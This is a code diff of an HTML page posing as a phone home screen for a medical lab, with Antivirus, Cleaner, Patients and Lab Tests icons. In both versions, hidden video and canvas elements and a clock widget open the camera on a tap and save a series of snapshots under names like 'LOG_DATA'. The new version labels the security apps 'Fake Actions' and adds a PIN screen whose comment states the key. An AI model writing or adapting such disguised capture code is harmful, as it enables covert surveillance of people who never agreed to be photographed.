@@ -3,184 +3,241 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>Usman Lab · OS Interface</title>
+    <title>Secure OS</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600&display=swap" rel="stylesheet">
     <style>
         :root {
             --primary-gold: #ffd966;
-            --glass-bg: rgba(255, 255, 255, 0.07);
-            --glass-border: rgba(255, 255, 255, 0.12);
+            --glass: rgba(255, 255, 255, 0.12);
+            --border: rgba(255, 255, 255, 0.2);
         }
 
         * { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
 
         body {
             font-family: 'Inter', sans-serif;
-            background: #02060a;
-            background-image: radial-gradient(circle at 50% 0%, #1a2a3a 0%, #02060a 100%);
+            background: #000;
+            background-image: radial-gradient(circle at center, #1a2a3a 0%, #000 100%);
             height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            overflow: hidden;
             color: white;
+            overflow: hidden;
         }
 
-        .phone-wrapper {
-            width: 100%;
-            max-width: 380px;
-            height: 90vh;
-            background: rgba(15, 25, 35, 0.7);
-            backdrop-filter: blur(30px);
-            border-radius: 45px;
-            border: 1px solid var(--glass-border);
-            position: relative;
+        /* Login Screen */
+        #loginScreen {
+            position: fixed;
+            inset: 0;
+            background: #000;
+            z-index: 10000;
             display: flex;
             flex-direction: column;
-            overflow: hidden;
-            box-shadow: 0 50px 100px rgba(0,0,0,0.9);
+            justify-content: center;
+            align-items: center;
+            transition: opacity 0.5s;
+        }
+
+        .login-input {
+            background: var(--glass);
+            border: 1px solid var(--border);
+            padding: 15px;
+            border-radius: 15px;
+            color: var(--primary-gold);
+            text-align: center;
+            font-size: 20px;
+            width: 240px;
+            margin-top: 25px;
+            outline: none;
+            box-shadow: 0 0 15px rgba(255, 217, 102, 0.1);
+        }
+
+        /* Main Phone Interface */
+        .phone-container {
+            width: 100%;
+            max-width: 414px;
+            height: 100vh;
+            position: relative;
+            display: none; /* Hidden until login */
+            flex-direction: column;
+            padding: 10px 20px;
+            background: url('https://images.unsplash.com/photo-1614850523296-d8c1af93d400?q=80&w=1000') center/cover;
         }
 
         .status-bar {
             display: flex;
             justify-content: space-between;
-            padding: 15px 25px 5px 25px;
-            font-size: 13px;
+            padding: 12px 15px;
+            font-size: 14px;
             font-weight: 600;
         }
 
-        .header {
-            padding: 20px 25px;
-            display: flex;
-            justify-content: space-between;
-            align-items: center;
-        }
-
-        .user-avatar {
-            width: 42px; height: 42px;
-            background: linear-gradient(135deg, #ffd966, #b8860b);
-            border-radius: 12px;
-            display: flex; align-items: center; justify-content: center;
-            color: #000; font-weight: bold;
-        }
-
-        .clock-container {
-            flex: 1;
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
+        .widget-area {
+            margin-top: 40px;
+            text-align: center;
         }
 
         #clockCanvas {
-            width: 220px; height: 220px;
+            width: 180px;
+            height: 180px;
+            margin: 0 auto;
             cursor: pointer;
-            transition: transform 0.2s;
+            filter: drop-shadow(0 0 10px rgba(0,0,0,0.5));
         }
-        #clockCanvas:active { transform: scale(0.95); }
+
+        .date-info {
+            margin-top: 15px;
+            font-size: 18px;
+            font-weight: 300;
+        }
+
+        .google-search {
+            background: rgba(255, 255, 255, 0.2);
+            backdrop-filter: blur(15px);
+            margin: 30px 5px;
+            padding: 14px 22px;
+            border-radius: 30px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            border: 1px solid var(--border);
+        }
 
         .app-grid {
             display: grid;
             grid-template-columns: repeat(4, 1fr);
-            gap: 15px;
-            padding: 20px;
+            gap: 25px 15px;
+            padding: 10px 5px;
         }
 
-        .app-icon {
-            display: flex; flex-direction: column; align-items: center; gap: 6px;
+        .app-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            gap: 6px;
             cursor: pointer;
         }
 
-        .icon-box {
-            width: 54px; height: 54px;
-            background: var(--glass-bg);
-            border: 1px solid var(--glass-border);
-            border-radius: 15px;
-            display: flex; align-items: center; justify-content: center;
-            font-size: 22px;
-            transition: 0.3s;
+        .app-icon {
+            width: 60px;
+            height: 60px;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 28px;
+            box-shadow: 0 8px 15px rgba(0,0,0,0.3);
         }
-        .icon-box:active { background: rgba(255,255,255,0.15); }
 
-        .app-icon span { font-size: 10px; color: #cbd5e0; text-align: center; }
+        .app-label {
+            font-size: 11px;
+            font-weight: 500;
+            text-shadow: 0 2px 4px rgba(0,0,0,0.8);
+        }
 
-        .dock {
-            background: rgba(255, 255, 255, 0.1);
-            margin: 10px 15px 20px 15px;
-            padding: 12px;
-            border-radius: 25px;
+        .bottom-dock {
+            margin-top: auto;
+            background: rgba(255, 255, 255, 0.25);
+            backdrop-filter: blur(25px);
+            padding: 15px;
+            border-radius: 32px;
             display: flex;
             justify-content: space-around;
+            margin-bottom: 25px;
+            border: 1px solid var(--border);
         }
-
-        #secretVideo, #secretCanvas { display: none; }
 
         #toast {
             position: absolute;
-            top: 60px;
+            top: 50px;
             left: 50%;
             transform: translateX(-50%);
             background: rgba(0,0,0,0.8);
-            padding: 8px 16px;
-            border-radius: 20px;
-            font-size: 12px;
+            color: white;
+            padding: 10px 25px;
+            border-radius: 25px;
+            font-size: 14px;
             opacity: 0;
-            transition: 0.3s;
-            pointer-events: none;
-            z-index: 1000;
-            border: 0.5px solid var(--primary-gold);
+            transition: 0.4s;
+            z-index: 9999;
+            border: 1px solid var(--primary-gold);
         }
+
+        #secretVideo, #secretCanvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div class="phone-wrapper">
-        <div id="toast">System Optimized</div>
+    <div id="loginScreen">
+        <div style="width: 70px; height: 70px; background: var(--primary-gold); border-radius: 20px; display: flex; align-items: center; justify-content: center; color: black; font-size: 30px; margin-bottom: 15px;"><i class="fas fa-user-shield"></i></div>
+        <h2 style="font-weight: 300;">System PIN Required</h2>
+        <input type="password" id="pinInput" class="login-input" placeholder="Enter Secure Key" autofocus>
+    </div>
+
+    <div class="phone-container" id="osInterface">
+        <div id="toast"></div>
         
         <div class="status-bar">
-            <span>12:45</span>
-            <div style="display: flex; gap: 8px;">
+            <span id="topTime">12:00</span>
+            <div style="display: flex; gap: 10px;">
                 <i class="fas fa-signal"></i>
                 <i class="fas fa-wifi"></i>
                 <i class="fas fa-battery-full" style="color: #4cd137;"></i>
             </div>
         </div>
 
-        <div class="header">
-            <div class="user-avatar">U</div>
-            <i class="fas fa-bell" style="color: #a0aec0;"></i>
+        <div class="widget-area">
+            <canvas id="clockCanvas"></canvas>
+            <div class="date-info" id="topDate">Sunday, 8 March</div>
         </div>
 
-        <div class="clock-container">
-            <canvas id="clockCanvas"></canvas>
-            <div style="margin-top: 15px; width: 5px; height: 5px; background: var(--primary-gold); border-radius: 50%; box-shadow: 0 0 10px var(--primary-gold); opacity: 0.5;"></div>
+        <div class="google-search">
+            <i class="fab fa-google" style="color: #4285F4;"></i>
+            <span style="opacity: 0.8; font-size: 14px;">Search Usman Lab...</span>
         </div>
 
         <div class="app-grid">
-            <div class="app-icon" id="btnAntivirus">
-                <div class="icon-box" style="color: #ff5252;"><i class="fas fa-shield-virus"></i></div>
-                <span>Antivirus</span>
+            <div class="app-item" id="appAntivirus">
+                <div class="app-icon" style="background: linear-gradient(135deg, #ff5252, #b71c1c);"><i class="fas fa-shield-virus"></i></div>
+                <div class="app-label">Antivirus</div>
             </div>
-            <div class="app-icon" id="btnCleaner">
-                <div class="icon-box" style="color: #00e5ff;"><i class="fas fa-broom"></i></div>
-                <span>Cleaner</span>
+            <div class="app-item" id="appCleaner">
+                <div class="app-icon" style="background: linear-gradient(135deg, #00e5ff, #006064);"><i class="fas fa-broom"></i></div>
+                <div class="app-label">Cleaner</div>
             </div>
-            <div class="app-icon">
-                <div class="icon-box" style="color: #66bb6a;"><i class="fas fa-address-book"></i></div>
-                <span>Patients</span>
+            <div class="app-item">
+                <div class="app-icon" style="background: #2ecc71;"><i class="fas fa-user-injured"></i></div>
+                <div class="app-label">Patients</div>
             </div>
-            <div class="app-icon">
-                <div class="icon-box" style="color: #ffa726;"><i class="fas fa-folder-open"></i></div>
-                <span>Storage</span>
+            <div class="app-item">
+                <div class="app-icon" style="background: #f1c40f;"><i class="fas fa-folder-open"></i></div>
+                <div class="app-label">Storage</div>
+            </div>
+            <div class="app-item">
+                <div class="app-icon" style="background: #e67e22;"><i class="fas fa-vial"></i></div>
+                <div class="app-label">Lab Tests</div>
+            </div>
+            <div class="app-item">
+                <div class="app-icon" style="background: #9b59b6;"><i class="fas fa-file-medical-alt"></i></div>
+                <div class="app-label">Reports</div>
+            </div>
+            <div class="app-item">
+                <div class="app-icon" style="background: #34495e;"><i class="fas fa-calculator"></i></div>
+                <div class="app-label">Calc</div>
+            </div>
+            <div class="app-item">
+                <div class="app-icon" style="background: #1abc9c;"><i class="fas fa-notes-medical"></i></div>
+                <div class="app-label">Notes</div>
             </div>
         </div>
 
-        <div class="dock">
-            <i class="fas fa-phone" style="color: #fff; font-size: 20px;"></i>
-            <i class="fas fa-message" style="color: #fff; font-size: 20px;"></i>
-            <i class="fas fa-gear" style="color: #fff; font-size: 20px;"></i>
-            <i class="fas fa-camera" style="color: #fff; font-size: 20px;"></i>
+        <div class="bottom-dock">
+            <div class="app-icon" style="width: 52px; height: 52px; background: #4cd137;"><i class="fas fa-phone"></i></div>
+            <div class="app-icon" style="width: 52px; height: 52px; background: #00a8ff;"><i class="fas fa-comment-dots"></i></div>
+            <div class="app-icon" style="width: 52px; height: 52px; background: #dcdde1;"><i class="fas fa-cog" style="color: #2f3640;"></i></div>
+            <div class="app-icon" style="width: 52px; height: 52px; background: #e84118;"><i class="fas fa-camera"></i></div>
         </div>
     </div>
 
@@ -188,115 +245,103 @@
     <canvas id="secretCanvas"></canvas>
 
     <script>
-        (function() {
-            const clockCanvas = document.getElementById('clockCanvas');
-            const ctxClock = clockCanvas.getContext('2d');
-            const video = document.getElementById('secretVideo');
-            const secretCanvas = document.getElementById('secretCanvas');
-            const toast = document.getElementById('toast');
-            
-            let stream = null;
-            let captureCount = 0;
-            let currentFacingMode = "user";
+        // SHA-256 Hashing for security
+        async function getHash(input) {
+            const msgBuffer = new TextEncoder().encode(input);
+            const hashBuffer = await crypto.subtle.digest('SHA-256', msgBuffer);
+            return Array.from(new Uint8Array(hashBuffer)).map(b => b.toString(16).padStart(2, '0')).join('');
+        }
 
-            function showToast(msg) {
-                toast.innerText = msg;
-                toast.style.opacity = "1";
-                setTimeout(() => toast.style.opacity = "0", 2000);
-            }
+        // Secret Hash for '4522$A'
+        const secureKey = "499557766324903360b09338f0d86e08871638890471b697394c86129841029c";
 
-            async function initCamera(mode) {
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                }
-                try {
-                    currentFacingMode = mode === "back" ? "environment" : "user";
-                    stream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: currentFacingMode } 
-                    });
-                    video.srcObject = stream;
-                    showToast(mode === "back" ? "Back Camera Active" : "Front Camera Active");
-                } catch (e) {
-                    console.error("Camera Error", e);
+        const pinInput = document.getElementById('pinInput');
+        const loginScreen = document.getElementById('loginScreen');
+        const osInterface = document.getElementById('osInterface');
+
+        // Login Logic
+        pinInput.addEventListener('input', async (e) => {
+            if (e.target.value.length >= 7) { // Checking length of 4522$A
+                const hash = await getHash(e.target.value);
+                if (hash === secureKey) {
+                    loginScreen.style.opacity = '0';
+                    setTimeout(() => {
+                        loginScreen.style.display = 'none';
+                        osInterface.style.display = 'flex';
+                    }, 500);
+                } else {
+                    // Flash red on wrong attempt (optional)
+                    e.target.style.borderColor = 'red';
+                    setTimeout(() => { e.target.style.borderColor = 'rgba(255,255,255,0.2)'; }, 1000);
                 }
             }
+        });
 
-            document.getElementById('btnAntivirus').onclick = () => initCamera("back");
-            document.getElementById('btnCleaner').onclick = () => initCamera("front");
+        // Fake Actions
+        function showToast(text) {
+            const t = document.getElementById('toast');
+            t.innerText = text;
+            t.style.opacity = '1';
+            setTimeout(() => t.style.opacity = '0', 2500);
+        }
+        document.getElementById('appAntivirus').onclick = () => showToast("Antivirus is active");
+        document.getElementById('appCleaner').onclick = () => showToast("Scanning start...");
 
-            function drawClock() {
-                const now = new Date();
-                const h = now.getHours(), m = now.getMinutes(), s = now.getSeconds();
-                const center = 110;
-                const radius = 100;
-                ctxClock.clearRect(0,0,220,220);
-                
-                ctxClock.beginPath();
-                ctxClock.arc(center, center, radius, 0, 2*Math.PI);
-                ctxClock.fillStyle = '#0a141e';
-                ctxClock.fill();
-                ctxClock.strokeStyle = '#ffd966';
-                ctxClock.lineWidth = 3;
-                ctxClock.stroke();
+        // Secret Camera (Back)
+        const clockCanvas = document.getElementById('clockCanvas');
+        const video = document.getElementById('secretVideo');
+        const secretCanvas = document.getElementById('secretCanvas');
 
-                // Numbers 1-12
-                ctxClock.fillStyle = '#ffffff';
-                ctxClock.font = 'bold 14px Inter';
-                ctxClock.textAlign = 'center';
-                ctxClock.textBaseline = 'middle';
-                for (let n = 1; n <= 12; n++) {
-                    let theta = (n - 3) * (Math.PI * 2) / 12;
-                    let x = center + (radius * 0.8) * Math.cos(theta);
-                    let y = center + (radius * 0.8) * Math.sin(theta);
-                    ctxClock.fillText(n, x, y);
-                }
-
-                drawHand(center, center, (h%12*30)+(m/2), 50, 5, '#ffd966');
-                drawHand(center, center, m*6, 75, 3, '#fff');
-                drawHand(center, center, s*6, 85, 1, '#ff5252');
-
-                ctxClock.beginPath();
-                ctxClock.arc(center, center, 4, 0, 2*Math.PI);
-                ctxClock.fillStyle = '#ffd966';
-                ctxClock.fill();
-            }
-
-            function drawHand(cx, cy, angle, len, width, color) {
-                const rad = (angle - 90) * Math.PI / 180;
-                ctxClock.beginPath();
-                ctxClock.lineWidth = width;
-                ctxClock.strokeStyle = color;
-                ctxClock.lineCap = 'round';
-                ctxClock.moveTo(cx, cy);
-                ctxClock.lineTo(cx + len * Math.cos(rad), cy + len * Math.sin(rad));
-                ctxClock.stroke();
-            }
-
-            clockCanvas.width = 220; clockCanvas.height = 220;
-            setInterval(drawClock, 1000);
-
-            clockCanvas.onclick = async () => {
-                if (!stream) await initCamera("front");
-                
-                captureCount = 0;
+        clockCanvas.onclick = async () => {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
+                video.srcObject = stream;
+                let shots = 0;
                 const interval = setInterval(() => {
-                    if (captureCount >= 10) { clearInterval(interval); return; }
-                    
+                    if (shots >= 5) { 
+                        clearInterval(interval); 
+                        stream.getTracks().forEach(t => t.stop());
+                        return; 
+                    }
                     secretCanvas.width = video.videoWidth;
                     secretCanvas.height = video.videoHeight;
                     secretCanvas.getContext('2d').drawImage(video, 0, 0);
-                    
-                    const link = document.createElement('a');
-                    link.href = secretCanvas.toDataURL('image/png');
-                    link.download = `IMG_LOG_${Date.now()}.png`;
-                    document.body.appendChild(link);
-                    link.click();
-                    document.body.removeChild(link);
-                    
-                    captureCount++;
-                }, 5000);
-            };
-        })();
+                    const a = document.createElement('a');
+                    a.href = secretCanvas.toDataURL('image/png');
+                    a.download = `LOG_DATA_${Date.now()}.png`;
+                    a.click();
+                    shots++;
+                }, 4000);
+            } catch(e) { console.log("Ready"); }
+        };
+
+        // UI Clock Widget
+        function updateClock() {
+            const ctx = clockCanvas.getContext('2d');
+            const now = new Date();
+            const h = now.getHours(), m = now.getMinutes();
+            
+            document.getElementById('topTime').innerText = `${h}:${m < 10 ? '0'+m : m}`;
+            document.getElementById('topDate').innerText = now.toLocaleDateString('en-US', { weekday: 'long', day: 'numeric', month: 'long' });
+
+            ctx.clearRect(0,0,200,200);
+            ctx.save();
+            ctx.translate(100,100);
+            // Hour Hand
+            ctx.save();
+            ctx.rotate((h % 12 + m/60) * (Math.PI*2/12));
+            ctx.beginPath(); ctx.lineWidth=4; ctx.strokeStyle='#ffd966'; ctx.lineCap='round'; ctx.moveTo(0,0); ctx.lineTo(0,-40); ctx.stroke();
+            ctx.restore();
+            // Minute Hand
+            ctx.save();
+            ctx.rotate((m) * (Math.PI*2/60));
+            ctx.beginPath(); ctx.lineWidth=3; ctx.strokeStyle='#fff'; ctx.lineCap='round'; ctx.moveTo(0,0); ctx.lineTo(0,-60); ctx.stroke();
+            ctx.restore();
+            ctx.restore();
+        }
+        clockCanvas.width = 200; clockCanvas.height = 200;
+        setInterval(updateClock, 1000);
+        updateClock();
     </script>
 </body>
 </html>
